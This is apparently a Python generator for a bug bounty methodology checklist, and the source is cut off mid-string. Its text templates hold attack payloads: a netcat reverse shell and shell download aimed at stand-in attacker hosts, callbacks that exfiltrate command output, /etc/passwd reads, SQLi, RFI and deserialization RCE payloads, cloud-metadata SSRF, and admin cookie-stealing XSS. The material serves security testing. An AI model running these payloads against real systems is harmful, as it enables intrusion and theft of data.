#aw_bounty_craft_v1.py

import os
import sys
from urllib.parse import urlparse

def create_methodology_framework(target_url, project_name):
    """
    Creates a highly structured and detailed methodology framework for a Bug Bounty program.

    Args:
        target_url (str): The URL of the target website.
        project_name (str): The name for the project directory.
    """
    # Ensure scheme is present for correct parsing
    if not target_url.startswith(("http://", "https://")):
        full_target_url = "https://" + target_url
    else:
        full_target_url = target_url

    parsed_url = urlparse(full_target_url)
    target_url_domain = parsed_url.netloc

    if not project_name:
        print("Error: Project name cannot be empty.")
        return

    # Sanitize project name to be safe for directory creation
    safe_project_name = "".join(c for c in project_name if c.isalnum() or c in ['-', '_']).strip()
    if not safe_project_name:
        if target_url_domain:
            safe_project_name = target_url_domain.replace('.', '_').replace('-', '_') + "_bounty"
        else:
            safe_project_name = "bug_bounty_project"

    base_dir = os.path.join(os.getcwd(), safe_project_name)

    try:
        os.makedirs(base_dir, exist_ok=True)
        print(f"Created project directory: {base_dir}")
    except OSError as e:
        print(f"Error creating directory {base_dir}: {e}")
        return

    # Define the phases and their corresponding files/content
    phases = {
        "01_Reconnaissance": {
            "01_Subdomain_Enumeration.txt": r"""# 01.01 Subdomain Enumeration

## Target: {target_url} (Domain: {target_url_domain})

This section focuses on discovering all possible subdomains associated with the target.

### Automated Tools & Commands:
*   **Subfinder:** `subfinder -d {target_url_domain} -o subdomains_subfinder.txt`
*   **Assetfinder:** `assetfinder --subs-only {target_url_domain} > subdomains_assetfinder.txt`
*   **Amass:** `amass enum -d {target_url_domain} -o subdomains_amass.txt`
*   **Findomain:** `findomain -t {target_url_domain} -u subdomains_findomain.txt`
*   **Knockpy:** `knockpy {target_url_domain} -o subdomains_knockpy.json`
*   **Combining results:** `cat subdomains_*.txt | sort -u > all_subdomains.txt`

### Passive Techniques:
*   **Certificate Transparency Logs:**
    *   `crt.sh` (search for `{target_url_domain}`)
    *   `Censys` (search for `parsed.names: {target_url_domain}`)
    *   `Shodan` (search for `hostname:{target_url_domain}`)
*   **DNS Records:** Use `dig` or online tools to check `NS`, `MX`, `TXT` records.
*   **Wayback Machine:** `waybackurls {target_url_domain} | grep -oP "https?://[^/]+" | sort -u > wayback_hosts.txt`
*   **Google Dorking:**
    *   `site:*.{target_url_domain} -www`
    *   `site:*.{target_url_domain} intitle:"index of /"`

### Active Techniques (Brute-forcing):
*   **Gobuster (DNS mode):** `gobuster dns -d {target_url_domain} -w /path/to/wordlist/subdomains-top1m.txt -o gobuster_dns_subs.txt`
*   **Ffuf (DNS mode):** `ffuf -w /path/to/wordlist/subdomains.txt -u http://FUZZ.{target_url_domain} -mc 200,301,302 -o ffuf_dns_subs.json`

## Notes:
*   Always combine results from multiple tools and techniques for maximum coverage.
*   Filter out dead or irrelevant subdomains later.
""",
            "02_Live_Host_Identification.txt": r"""# 01.02 Live Host Identification

## Target: {target_url} (Domain: {target_url_domain})

This section focuses on identifying which of the discovered subdomains are actually alive and responding.

### Automated Tools & Commands:
*   **HTTPX:** `httpx -list all_subdomains.txt -o live_hosts.txt`
*   **Naabu:** `naabu -list all_subdomains.txt -p 80,443,8000,8080 -silent -o live_hosts_naabu.txt`
*   **Masscan (for specific ports):** `masscan -iL all_subdomains.txt -p80,443,8000,8080 --rate=1000 -oG masscan_live.txt`

### Visual Reconnaissance:
*   **Aquatone:** `cat live_hosts.txt | aquatone -chrome-path /usr/bin/google-chrome -out aquatone_screenshots`
*   **Eyewitness:** `eyewitness -f live_hosts.txt -d eyewitness_screenshots --web`

## Notes:
*   Screenshots can quickly reveal interesting or misconfigured applications.
*   Focus on HTTP/S responses (200 OK) to ensure the host is active.
""",
            "03_Port_Scanning_Service_Discovery.txt": r"""# 01.03 Port Scanning & Service Discovery

## Target: {target_url} (Domain: {target_url_domain})

This section aims to identify open ports and the services running on them for live hosts.

### Automated Tools & Commands:
*   **Nmap (Full TCP Scan):** `nmap -sS -sV -T4 -p- -iL live_hosts.txt -oN nmap_full_scan.txt`
*   **Nmap (Script Scan for common ports):** `nmap -sC -sV -iL live_hosts.txt -oN nmap_script_scan.txt`
*   **Naabu (Fast Port Scan):** `naabu -list live_hosts.txt -p top-1000 -o naabu_top_ports.txt`
*   **Masscan (Fastest Scan):** `masscan -iL all_subdomains.txt -p1-65535,U:1-65535 --rate=5000 -oG masscan_all_ports.txt`

### Manual Analysis:
*   **Telnet/Netcat:** `nc -zv {target_url_domain} <port_number>` (Use domain as IP is not always known at this stage) to confirm open ports.
*   **Browser:** Manually visit open HTTP/S ports to identify web applications.
*   **Service Banners:** Analyze `nmap` output for service versions and potential vulnerabilities.

## Notes:
*   Prioritize web ports (80, 443, 8000, 8080, 8443) for initial web application testing.
*   Look for unusual open ports that might indicate internal services or misconfigurations.
""",
            "04_Content_Discovery.txt": r"""# 01.04 Content Discovery

## Target: {target_url} (Domain: {target_url_domain})

This section focuses on discovering hidden directories, files, and endpoints.

### Automated Tools & Commands:
*   **Dirsearch:** `dirsearch -u {target_url} -e php,asp,aspx,jsp,html,js,json,xml,txt,bak,old,zip,tar.gz -w /path/to/wordlist/dirsearch/big.txt -o dirsearch_results.txt`
*   **Gobuster (Directory mode):** `gobuster dir -u {target_url} -w /path/to/wordlist/common.txt -o gobuster_dir_results.txt`
*   **Ffuf (Directory/File fuzzing):** `ffuf -u {target_url}/FUZZ -w /path/to/wordlist/common.txt -mc 200,301,302,403 -o ffuf_dir_results.json`
*   **Feroxbuster:** `feroxbuster -u {target_url} -w /path/to/wordlist/rockyou.txt --depth 3 -o feroxbuster_results.txt`

### Passive Techniques:
*   **Robots.txt:** Check `{target_url}/robots.txt` for disallowed paths.
*   **Sitemap.xml:** Check `{target_url}/sitemap.xml` for indexed pages.
*   **Wayback Machine & Common Crawl:**
    *   `waybackurls {target_url_domain} > wayback_urls.txt`
    *   `gau {target_url_domain} > gau_urls.txt`
    *   Filter for interesting file extensions and parameters: `cat wayback_urls.txt | grep -E "\.(js|css|php|jsp|aspx|json|xml)\?.*=" | sort -u`
*   **Google Dorking:**
    *   `site:*.{target_url_domain} -www`
    *   `site:*.{target_url_domain} intitle:"index of /"`
    *   `site:{target_url_domain} filetype:pdf`
    *   `site:{target_url_domain} inurl:admin`

## Notes:
*   Use multiple wordlists (small, medium, large, specific) for thoroughness.
*   Pay attention to interesting status codes like 403 (Forbidden) which might indicate hidden content.
""",
            "05_JavaScript_Analysis.txt": r"""# 01.05 JavaScript Analysis

## Target: {target_url} (Domain: {target_url_domain})

This section focuses on analyzing JavaScript files for sensitive information, API endpoints, and hidden functionality.

### Automated Tools & Commands:
*   **SubJS:** `subjs -d {target_url_domain} -o js_files.txt` (extracts JS files from live hosts)
*   **Linkfinder:** `python linkfinder.py -i <javascript_file_url> -o linkfinder_results.js` (extracts links/endpoints from JS files)
*   **JSFScan.py:** `python jsfscan.py -u {target_url} -o jsfscan_results.txt` (automates JS file discovery and analysis)

### Manual Techniques:
*   **Browser Developer Tools:**
    *   Inspect `Sources` tab for loaded JS files.
    *   Search (`Ctrl+Shift+F` or `Cmd+Option+F`) within sources for keywords like `api`, `token`, `password`, `key`, `admin`, `internal`, `secret`.
    *   Analyze network requests initiated by JS.
*   **Static Analysis:**
    *   Download interesting JS files.
    *   Use `grep` or text editors to search for sensitive strings, hidden API endpoints, unhandled error messages, or hardcoded credentials.
    *   Look for URLs, parameters, and sensitive functions.
*   **Dynamic Analysis (Runtime):**
    *   Set breakpoints in the browser's debugger to understand JS execution flow.
    *   Manipulate JS variables at runtime to bypass client-side checks.

## Notes:
*   Focus on minified and obfuscated JS files – these often contain interesting logic.
*   Look for API keys, internal endpoints, debug functions, and comments.
""",
            "06_Cloud_Reconnaissance.txt": r"""# 01.06 Cloud Reconnaissance

## Target: {target_url} (Domain: {target_url_domain})

This section focuses on identifying and analyzing cloud-based assets and potential misconfigurations.

### Automated Tools & Commands:
*   **S3Scanner:** `s3scanner -o s3_buckets.txt` (scans for open S3 buckets)
*   **Cloud-Enum:** `python cloud_enum.py -k {target_url_domain} -o cloud_enum_results.txt` (enumerates common cloud resources)
*   **Bucket Stream:** `bucket_stream {target_url_domain}` (monitors S3 bucket activity)
*   **DumpsterDiver:** `python dumpsterDiver.py -i {target_url_domain} -o dumpster_diver_results.txt` (searches for sensitive info in public cloud storage)

### Manual Techniques:
*   **AWS S3 Buckets:**
    *   Try common bucket naming conventions: `{target_url_domain}`, `{target_url_domain}-prod`, `{target_url_domain}-dev`, `static.{target_url_domain}`.
    *   Check for public read/write access.
    *   Look for sensitive files: backups, configurations, logs, user data.
*   **Azure Blob Storage:**
    *   Similar naming conventions.
    *   Check for anonymous public access.
*   **Google Cloud Storage:**
    *   Check for public buckets.
*   **Metadata Endpoints:**
    *   Attempt SSRF to access cloud metadata endpoints (e.g., `http://169.254.169.254/latest/meta-data/` for AWS EC2).

## Notes:
*   Cloud misconfigurations (e.g., publicly exposed storage, weak IAM policies) are common and high-impact.
*   Always verify access before reporting, and be careful not to modify data.
""",
            "07_Parameter_Discovery.txt": r"""# 01.07 Parameter Discovery

## Target: {target_url} (Domain: {target_url_domain})

This section focuses on discovering hidden or less obvious parameters in URLs and requests.

### Automated Tools & Commands:
*   **Arjun:** `arjun -u {target_url} -o arjun_params.txt`
*   **ParamSpider:** `python paramspider.py -d {target_url_domain} -o paramspider_params.txt`
*   **Gf (grep for parameters):** `cat all_urls.txt | gf param > interesting_params.txt` (requires `gf` patterns)
*   **Waybackurls/Gau + grep:** `cat wayback_urls.txt | grep "?" | grep "=" | sort -u > discovered_params.txt`

### Manual Techniques:
*   **Analyze JavaScript:** Look for parameters used in client-side code that might not be visible in URLs.
*   **Intercept Proxy (Burp Suite):**
    *   Examine all requests and responses for hidden parameters in POST bodies, JSON, XML, or custom headers.
    *   Use the "Engage" tab for passive scanning.
*   **Error Messages:** Sometimes, error messages can disclose parameter names.
*   **Documentation:** If API documentation is available, review it for parameters.

## Notes:
*   Hidden parameters can often lead to vulnerabilities like LFI, SSRF, SQLi, or XSS if not properly handled.
*   Test each discovered parameter for different vulnerability types.
""",
        },
        "02_Injection_Flaws": {
            "01_SQL_Injection.txt": r"""# 02.01 SQL Injection (SQLi)

## Target: {target_url}

SQL Injection allows an attacker to interfere with the queries that an application makes to its database.

### Automated Tools & Commands:
*   **SQLMap:**
    *   `sqlmap -u "{target_url}?id=1" --batch --risk=3 --level=5 -o sqlmap_results.txt` (Basic GET parameter)
    *   `sqlmap -r request.txt --batch --risk=3 --level=5 -o sqlmap_post_results.txt` (From a captured HTTP request file)
    *   `sqlmap -u "{target_url}/api/v1/user/1" --data="{'username':'admin','password':'password'}" --json --batch` (JSON POST)
*   **Burp Suite (Active Scan):** Use Burp's active scanner on identified injection points.

### Manual Testing Methodology:
1.  **Identify Injection Points:**
    *   **GET Parameters:** `?id=1`, `?category=books`
    *   **POST Data:** Login forms, search fields, comments.
    *   **HTTP Headers:** `User-Agent`, `Referer`, `X-Forwarded-For`, `Cookie`.
    *   **JSON/XML Payloads:** API requests.
2.  **Test for Error-Based SQLi:**
    *   Append a single quote `'` or double quote `"` to parameters: `{target_url}?id=1'`
    *   Use arithmetic operations: `{target_url}?id=1+1` (should return result for ID 2)
    *   Try comments: `{target_url}?id=1-- -` or `{target_url}?id=1%23`
3.  **Test for Boolean-Based Blind SQLi:**
    *   True condition: `{target_url}?id=1 AND 1=1` (page loads normally)
    *   False condition: `{target_url}?id=1 AND 1=2` (page changes or shows error)
    *   Use `SUBSTRING`, `LENGTH`, `ASCII` functions to extract data character by character.
4.  **Test for Time-Based Blind SQLi:**
    *   `{target_url}?id=1 AND SLEEP(5)` or `{target_url}?id=1 UNION SELECT SLEEP(5)`
    *   If the response is delayed, it confirms the vulnerability.
5.  **Test for Union-Based SQLi:**
    *   Determine number of columns: `ORDER BY 1,2,3...` until an error occurs.
    *   Use `UNION SELECT NULL,NULL,...` to find injectable columns.
    *   Extract data: `UNION SELECT database(), version(), user(), ...`
6.  **Out-of-Band SQLi (OOB-SQLi):**
    *   Use functions like `LOAD_FILE` (MySQL), `DBMS_PIPE` (Oracle), `xp_dirtree` (MSSQL) to trigger DNS/HTTP requests to your controlled server.
    *   Example MySQL payload: `' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT DATABASE()), '.yourdomain.com\\abc'))-- -`

### Common Payloads:
*   `'`
*   `"`
*   `OR 1=1-- -`
*   `' OR 1=1-- -`
*   `" OR 1=1-- -`
*   `AND 1=2 UNION SELECT 1,2,3... -- -`
*   `SLEEP(5)`
*   `benchmark(10000000,MD5(1))`

## Notes:
*   Always use a web proxy (Burp Suite) to intercept and modify requests.
*   Test every single input point, even HTTP headers.
*   SQLi can lead to full database compromise.
""",
            "02_Command_Injection.txt": r"""# 02.02 Command Injection

## Target: {target_url}

Command Injection allows an attacker to execute arbitrary operating system commands on the server.

### Automated Tools:
*   **Burp Suite Intruder:** Fuzz parameters with command injection payloads.
*   **Commix:** `commix --url="{target_url}?cmd=whoami" --level=3 --risk=3` (Automated command injection tool)

### Manual Testing Methodology:
1.  **Identify Injection Points:**
    *   Any input field that might pass data to a system command (e.g., "ping" utility, "lookup" tool, file operations).
    *   Parameters in URLs, POST data, JSON/XML bodies.
2.  **Test for Command Execution:**
    *   **Linux/Unix:**
        *   `[input]; ls -la`
        *   `[input] && id`
        *   `[input] | pwd`
        *   `[input] $(id)`
        *   `[input] `id``
        *   `[input] %0a id` (newline)
        *   `[input] %0d id` (carriage return)
    *   **Windows:**
        *   `[input] & dir`
        *   `[input] | whoami`
        *   `[input] && ipconfig`
    *   **Blind Command Injection (Time-based/Out-of-Band):**
        *   `[input]; sleep 5` (Linux)
        *   `[input] & ping -n 5 127.0.0.1` (Windows)
        *   `[input]; curl http://your_collaborator_server/$(whoami)` (OOB)
        *   `[input]; nslookup $(whoami).your_collaborator_server` (OOB)
3.  **Confirm Execution:**
    *   Look for command output in the response.
    *   Look for time delays for blind injections.
    *   Check your collaborator server for OOB interactions.
    *   Try to read sensitive files: `[input]; cat /etc/passwd` or `[input] & type C:\Windows\System32\drivers\etc\hosts`
    *   Try to create/delete files: `[input]; touch /tmp/test_file`

### Common Payloads:
*   `; id`
*   `&& whoami`
*   `| hostname`
*   `%0a cat /etc/passwd`
*   `%0a sleep 5`
*   `%0a wget http://your_server/shell.php`
*   `%0a rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc your_ip your_port >/tmp/f` (Reverse Shell)

## Notes:
*   Command injection often leads to Remote Code Execution (RCE), which is critical.
*   Test all characters used for command chaining: `;`, `&`, `&&`, `|`, `||`, `$(...)`, `` `...` ``.
*   Be cautious with destructive commands (e.g., `rm -rf /`).
""",
            "03_LFI_RFI.txt": r"""# 02.03 Local File Inclusion (LFI) & Remote File Inclusion (RFI)

## Target: {target_url}

LFI/RFI vulnerabilities allow an attacker to include files on a server, potentially leading to information disclosure or RCE.

### Automated Tools:
*   **LFI Scanner (e.g., LFISuite):** `python LFISuite.py -u "{target_url}?file=test"`
*   **Ffuf (File fuzzing):** `ffuf -u "{target_url}?file=FUZZ" -w /path/to/LFI_payloads.txt -o lfi_results.json`

### Manual Testing Methodology:
1.  **Identify Injection Points:**
    *   Parameters that take file names or paths as input: `?page=contact.php`, `?template=header`, `?file=report.txt`.
2.  **Test for LFI:**
    *   **Path Traversal:**
        *   `{target_url}?file=../../../../etc/passwd`
        *   `{target_url}?file=../../../../windows/system32/drivers/etc/hosts`
        *   Try different numbers of `../` to escape directories.
    *   **Null Byte Bypass:** `{target_url}?file=../../../../etc/passwd%00` (for older PHP versions)
    *   **Encoding:** URL encode payloads.
    *   **Log Poisoning (LFI to RCE):**
        *   Inject malicious PHP code into web server logs (e.g., via User-Agent header).
        *   Then, use LFI to include the log file: `{target_url}?file=../../../../var/log/apache2/access.log`
    *   **PHP Wrappers:**
        *   `php://filter/convert.base64-encode/resource=/etc/passwd` (read source code)
        *   `php://input` (upload code via POST)
        *   `data://text/plain,<?php system('id'); ?>` (direct code execution)
3.  **Test for RFI:**
    *   `{target_url}?file=http://your_server/malicious.php`
    *   The server must have `allow_url_include` enabled (rarely the case now).
    *   If successful, `malicious.php` (containing `<?php system('id'); ?>`) will be executed.

### Common Payloads:
*   `../../../../etc/passwd`
*   `../../../../windows/system32/drivers/etc/hosts`
*   `/etc/passwd`
*   `file:///etc/passwd`
*   `php://filter/convert.base64-encode/resource=index.php`
*   `data://text/plain,<?php system('id'); ?>`
*   `http://your_server/shell.txt` (for RFI)

## Notes:
*   LFI can lead to sensitive information disclosure (credentials, config files) and potentially RCE.
*   RFI is less common but highly critical if found.
*   Always check for common log file paths: `/var/log/apache2/access.log`, `/var/log/nginx/access.log`, `/proc/self/environ`.
""",
            "04_SSRF.txt": r"""# 02.04 Server-Side Request Forgery (SSRF)

## Target: {target_url}

SSRF allows an attacker to cause the server to make requests to an arbitrary domain of the attacker's choosing.

### Automated Tools:
*   **Burp Suite (Collaborator Client):** Use Collaborator to detect out-of-band interactions.
*   **SSRFmap:** `python ssrfmap.py -r request.txt -p ssrf_param` (Automated SSRF testing)
*   **Gopherus:** For generating Gopher payloads for various protocols.

### Manual Testing Methodology:
1.  **Identify Injection Points:**
    *   Parameters that accept URLs: image import, PDF generation, file conversion, webhooks, URL previews, XML external entities (XXE).
    *   Any functionality that fetches data from a remote resource.
2.  **Test for Basic SSRF:**
    *   **External Request:**
        *   Input `http://your_collaborator_server/test` into the URL parameter.
        *   Check your Collaborator for an incoming request.
    *   **Internal Request (Localhost):**
        *   Input `http://localhost/` or `http://127.0.0.1/`.
        *   Look for error messages or content from the local server.
        *   Try common internal ports: `http://127.0.0.1:8080`, `http://127.0.0.1:22`.
    *   **Cloud Metadata Endpoints:**
        *   AWS: `http://169.254.169.254/latest/meta-data/`
        *   Azure: `http://169.254.169.254/metadata/instance?api-version=2017-08-01`
        *   Google Cloud: `http://169.254.169.254/computeMetadata/v1/instance/`
3.  **Bypassing Filters:**
    *   **IP Address Encoding:**
        *   Decimal: `http://2130706433/` (for 127.0.0.1)
        *   Octal: `http://0177.0.0.1/`
        *   Hexadecimal: `http://0x7f000001/`
    *   **URL Shorteners/Redirectors:** Use `http://bit.ly/malicious` or `http://evil.com@legit.com`
    *   **DNS Resolution:** Use custom DNS entries that resolve to internal IPs.
    *   **Schemes:** Try `file:///`, `dict://`, `gopher://`.
    *   **Partial Blacklists:** `http://127.0.0.1.xip.io/` or `http://localhost:80%23/`
    *   **Double Encoding:** URL encode multiple times.

### Common Payloads:
*   `http://your_collaborator_server/`
*   `http://localhost/`
*   `http://127.0.0.1/`
*   `http://169.254.169.254/latest/meta-data/` (AWS)
*   `file:///etc/passwd`
*   `dict://localhost:6379/info` (Redis)
*   `gopher://localhost:80/_GET%20/admin%0AHost:%20localhost%0A%0A` (Gopher for internal HTTP requests)

## Notes:
*   SSRF can lead to internal network scanning, access to sensitive internal services, and data exfiltration.
*   Always try to reach cloud metadata endpoints if the target is hosted on a cloud provider.
*   Combine with Gopher protocol for more complex internal interactions.
""",
            "05_Insecure_Deserialization.txt": r"""# 02.05 Insecure Deserialization

## Target: {target_url}

Insecure deserialization occurs when untrusted data is used to reconstruct objects, which can lead to RCE, DoS, or privilege escalation.

### Automated Tools:
*   **ysoserial:** (Java deserialization payloads)
*   **PHPGGC:** (PHP deserialization payloads)
*   **GadgetProbe:** (Detects deserialization gadgets)
*   **Burp Suite (Deserialization Scanner):** Pro version has specific checks.

### Manual Testing Methodology:
1.  **Identify Serialization Points:**
    *   Look for base64 encoded strings, XML, JSON, or other structured data in cookies, hidden form fields, URL parameters, or API requests.
    *   Common indicators: `rO0ABX...` (Java), `O:8:"...` (PHP), `__CLASS__` (Python).
2.  **Understand the Application's Language/Framework:** This is crucial for selecting the correct deserialization payloads.
3.  **Generate Malicious Payloads:**
    *   Use `ysoserial` (for Java) to generate payloads for RCE with known gadgets (e.g., CommonsCollections, Jdk7u21).
    *   Use `PHPGGC` (for PHP) to generate payloads for RCE (e.g., Laravel, Symfony).
    *   For Python, look for `pickle` deserialization issues.
4.  **Inject the Payload:**
    *   Replace the legitimate serialized object with your malicious payload.
    *   Send the modified request.
5.  **Confirm Exploitation:**
    *   Check for RCE (e.g., DNS callback, file creation, command output in response).
    *   Check for application crashes (DoS).

### Common Payloads (Examples - highly specific to context):
*   **Java (ysoserial CommonsCollections1 RCE):**
    `java -jar ysoserial.jar CommonsCollections1 "id" | base64` (then URL encode and inject)
*   **PHP (PHPGGC Laravel RCE):**
    `phpggc --phar --base64 Laravel/RCE1 system id` (then inject)
*   **Python (pickle RCE):**
    `import pickle; import os; class RCE: def __reduce__(self): return (os.system, ('id',)); payload = pickle.dumps(RCE());` (then base64 encode and inject)

## Notes:
*   Insecure deserialization is a complex but high-impact vulnerability, often leading to RCE.
*   Requires knowledge of the underlying language/framework and available "gadgets."
*   Always test in a controlled environment as it can cause application instability.
""",
        },
        "03_Cross_Site_Scripting_XSS": {
            "01_Reflected_XSS.txt": r"""# 03.01 Reflected Cross-Site Scripting (XSS)

## Target: {target_url}

Reflected XSS occurs when user-supplied data is immediately returned by the web application in an unsafe way, without proper sanitization.

### Automated Tools & Commands:
*   **XSStrike:** `xsstrike -u "{target_url}?param=test" --crawl -o xsstrike_results.json`
*   **Dalfox:** `dalfox url "{target_url}?param=test" -o dalfox_results.txt`
*   **Burp Suite (Active Scan):** Active scanning on identified input points.

### Manual Testing Methodology:
1.  **Identify Injection Points:**
    *   Any parameter in a GET request URL (`?search=test`, `?name=user`).
    *   Any parameter in a POST request body (search forms, login errors).
    *   HTTP Headers (User-Agent, Referer, custom headers).
2.  **Basic Payload Injection:**
    *   Inject a simple HTML tag: `<H1>XSS</H1>`
    *   Inject a simple script: `<script>alert(1)</script>`
    *   Look for the injected content in the browser's source code or rendered page.
3.  **Context Analysis:**
    *   **HTML Context:** If injection is within HTML tags (e.g., `<div>[input]</div>`), basic `<script>` tags might work.
    *   **Attribute Context:** If injection is within an HTML attribute (e.g., `<input value="[input]">`), try breaking out or using event handlers: `"><script>alert(1)</script>" or `onmouseover="alert(1)"`.
    *   **JavaScript Context:** If injection is inside a `<script>` block (e.g., `var data = '[input]';`), try breaking out of quotes: `';alert(1)//` or `'-alert(1)-'`.
    *   **URL Context:** If injection is in `href` or `src` attributes, use `javascript:alert(1)` or `data:text/html,<script>alert(1)</script>`.
4.  **Bypassing Filters:**
    *   **Case Changes:** `<sCrIpT>alert(1)</sCrIpT>`
    *   **Encoding:** URL encoding, HTML encoding, double encoding.
    *   **Obfuscation:** Using different event handlers (`onerror`, `onload`), different tags (`<img>`, `<svg>`, `<iframe>`), or character encodings.
    *   **Blocked Keywords:** Replace `script` with `sCrIpT`, `javascript` with `&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74`.
    *   **Null Bytes:** `%00` might bypass some filters.
    *   **Polyglots:** Payloads designed to work in multiple contexts.

### Common Payloads:
*   `<script>alert(document.domain)</script>`
*   `"><script>alert(document.cookie)</script>`
*   `'';!--"<XSS>=&()[input]`
*   `<img src=x onerror=alert(1)>`
*   `<svg onload=alert(1)>`
*   `javascript:alert(1)` (in `href`)
*   `'-alert(1)-'` (in JS context)

## Notes:
*   Reflected XSS often requires user interaction (e.g., clicking a malicious link).
*   Impact includes session hijacking, defacement, redirection, and phishing.
*   Always use a browser extension like "HackBar" or "XSS Hunter" for easier testing and detection.
""",
            "02_Stored_XSS.txt": r"""# 03.02 Stored Cross-Site Scripting (XSS)

## Target: {target_url}

Stored XSS (or Persistent XSS) occurs when malicious script is injected into a web application's database and is displayed to other users later without proper sanitization.

### Automated Tools:
*   **XSStrike/Dalfox:** Can be used on input fields, but stored XSS often requires manual interaction to trigger.
*   **Burp Suite (Active Scan):** Can identify potential injection points.

### Manual Testing Methodology:
1.  **Identify Storage Points:**
    *   Any input field where data is saved and later retrieved: comments, forum posts, user profiles, chat messages, product reviews, contact forms (if displayed in admin panel).
2.  **Inject Malicious Data:**
    *   Submit XSS payloads into these input fields.
    *   Examples: `<script>alert('Stored XSS')</script>`, `<img src=x onerror=alert('Stored XSS')>`
3.  **Trigger the Payload:**
    *   Visit the page where the submitted data is displayed (e.g., view the comment, check the user profile, access the admin panel where contact forms are listed).
    *   If the payload executes, you have found Stored XSS.
4.  **Context Analysis & Bypasses:**
    *   Apply the same context analysis and bypass techniques as for Reflected XSS.
    *   Pay close attention to rich text editors (WYSIWYG) as they often allow HTML input.
    *   Sometimes, XSS might trigger only for specific user roles (e.g., admin).

### Common Payloads:
*   `<script>alert(document.domain)</script>`
*   `<img src=x onerror=alert(document.cookie)>`
*   `<iframe src="javascript:alert('XSS')"></iframe>`
*   `<svg onload=alert('Stored XSS')>`
*   `<details open ontoggle=alert('XSS')>` (HTML5 payload)
*   For admin panels: Use XSS Hunter payload `<script src=//YOUR_XSS_HUNTER_DOMAIN></script>` to capture admin cookies.

## Notes:
*   Stored XSS is generally more critical than Reflected XSS because it doesn't require direct user interaction with a malicious link.
*   It can affect many users or high-privileged users (like administrators).
*   Always document the exact steps to inject and trigger the payload.
""",
            "03_DOM_XSS.txt": r"""# 03.03 DOM-Based Cross-Site Scripting (XSS)

## Target: {target_url}

DOM-Based XSS occurs when client-side JavaScript takes data from a controllable source (e.g., URL fragment, `document.referrer`) and passes it to a dangerous sink (e.g., `eval()`, `document.write()`, `innerHTML`) without proper sanitization.

### Automated Tools:
*   **Burp Suite (DOM Invader - Pro version):** Excellent tool for finding DOM XSS.
*   **Semgrep/ESLint:** Can be used for static analysis of JavaScript code to find dangerous sinks.

### Manual Testing Methodology:
1.  **Identify Sources and Sinks:**
    *   **Sources (Controllable Inputs):** `document.URL`, `document.baseURI`, `location.hash`, `location.search`, `document.referrer`, `window.name`, `localStorage`, `sessionStorage`.
    *   **Sinks (Dangerous Functions):** `document.write()`, `document.writeln()`, `document.createElement()`, `element.innerHTML`, `element.outerHTML`, `element.insertAdjacentHTML()`, `history.pushState()`, `history.replaceState()`, `jQuery.globalEval()`, `eval()`, `setTimeout()`, `setInterval()`, `execCommand()`, `document.cookie` (for injection into cookie values that are later reflected).
2.  **Trace Data Flow:**
    *   Use browser developer tools (e.g., Chrome DevTools) to set breakpoints on identified sources and sinks.
    *   Observe how user-controlled data flows from a source to a sink.
3.  **Inject Payloads:**
    *   Manipulate the source (e.g., change `location.hash` in the URL) to introduce XSS payloads into the sink.
    *   Example: `#{target_url}/#<img src=x onerror=alert(1)>`
    *   Example: `javascript:alert(1)` in `location.href` or `location.replace()`.
4.  **Bypassing Filters:**
    *   Similar techniques to Reflected/Stored XSS, but often focused on JavaScript context.
    *   URL encoding, HTML encoding, character escapes, using different functions (`String.fromCharCode()`, `atob()`).

### Common Payloads:
*   `#<img src=x onerror=alert(document.domain)>`
*   `#javascript:alert(document.cookie)` (if directly used in a URL context that executes JS)
*   `#'-alert(1)-'` (if injected into a JS string context)
*   `#%27%3Balert%28document.domain%29%2F%2F` (URL encoded: `';alert(document.domain)//`)

## Notes:
*   DOM XSS is purely client-side; the vulnerability isn't necessarily in the server-side code.
*   Requires a good understanding of JavaScript and how the application manipulates the DOM.
*   DOM Invader in Burp Suite is highly recommended for efficient DOM XSS hunting.
""",
        },
        "04_Broken_Authentication": {
            "01_Authentication_Bypasses.txt": r"""# 04.01 Broken Authentication - Bypass Techniques

## Target: {target_url}

Broken authentication vulnerabilities allow attackers to bypass authentication mechanisms.

### Manual Testing Methodology:
1.  **Default Credentials:**
    *   Try common default usernames and passwords (admin:admin, admin:password, test:test, root:root).
    *   Search online for default credentials for specific software/frameworks used by the target.
2.  **Weak Passwords/Brute-Force:**
    *   Attempt to brute-force login forms with common weak passwords or password lists.
    *   Check for rate limiting on login attempts.
    *   **Tools:** Burp Suite Intruder, Hydra.
3.  **SQL Injection on Login Forms:**
    *   Try SQLi payloads in username/password fields:
        *   Username: `' OR 1=1-- -` Password: `any`
        *   Username: `admin'-- -` Password: `any`
        *   Username: `admin' OR '1'='1` Password: `any`
4.  **NoSQL Injection on Login Forms:**
    *   For MongoDB, try: `username[$ne]=null&password[$ne]=null` or `username=admin&password[$ne]=null`
5.  **Logic Flaws in Login/Password Reset:**
    *   **Password Reset Token Bypass:**
        *   Can you reuse an old token?
        *   Can you predict a token?
        *   Is the token tied to the user's session/IP?
        *   Can you request a token for another user and use it?
    *   **Direct Access to Authenticated Pages:** Try navigating directly to `/admin`, `/dashboard`, `/profile` without logging in.
    *   **Response Manipulation:** Change `loggedIn=false` to `loggedIn=true` in the response, or change `isAdmin=0` to `isAdmin=1`.
    *   **Parameter Tampering:** Modify parameters in login/reset requests (e.g., change `user_id=123` to `user_id=admin_id`).
    *   **OAuth/SSO Bypass:**
        *   Can you register with an email that matches an existing user?
        *   Are state parameters properly validated?
        *   Can you modify redirect_uri to an attacker-controlled domain?
6.  **Session Fixation:**
    *   Log in, capture your session ID.
    *   Log out, then try to use the captured session ID. If it works, the session is not invalidated.
7.  **Multi-Factor Authentication (MFA) Bypass:**
    *   Can you skip the MFA step?
    *   Can you reuse old MFA codes?
    *   Is MFA enforced consistently across all login flows?

## Notes:
*   Authentication bypasses are often critical as they grant unauthorized access.
*   Always analyze the entire authentication flow, including registration, login, password reset, and logout.
*   Look for weak logic rather than just technical flaws.
""",
            "02_Session_Management.txt": r"""# 04.02 Broken Authentication - Session Management

## Target: {target_url}

Weaknesses in session management can lead to session hijacking and unauthorized access.

### Manual Testing Methodology:
1.  **Session Token Predictability:**
    *   Are session IDs sequential, timestamp-based, or easily guessable?
    *   **Tools:** Burp Suite Sequencer (for randomness analysis).
2.  **Session Expiration:**
    *   Do sessions expire after a reasonable period of inactivity?
    *   Do sessions expire after logout? (Test for session fixation).
    *   Do "Remember Me" functionalities have appropriate long-term token management?
3.  **Session Token in URL:**
